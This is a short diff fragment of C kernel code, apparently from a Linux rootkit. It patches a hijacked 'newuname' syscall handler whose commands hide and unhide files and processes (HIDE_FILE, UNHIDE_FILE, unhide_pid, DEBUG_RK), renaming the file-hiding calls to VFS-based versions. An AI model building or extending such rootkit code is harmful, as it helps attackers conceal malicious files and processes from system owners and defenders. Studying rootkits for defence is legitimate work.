@@ -602,10 +602,10 @@ asmlinkage long new_sys_newuname(struct new_utsname *name)
 		unhide_pid(args.param1);
 		break;
 	case HIDE_FILE:
-		hide_filename(args.p_param1, args.param2);
+		vfs_hide_filename(args.p_param1, args.param2);
 		break;
 	case UNHIDE_FILE:
-		unhide_filename(args.p_param1, args.param2);
+		vfs_unhide_filename(args.p_param1, args.param2);
 		break;
 #ifdef DEBUG
 	case DEBUG_RK:
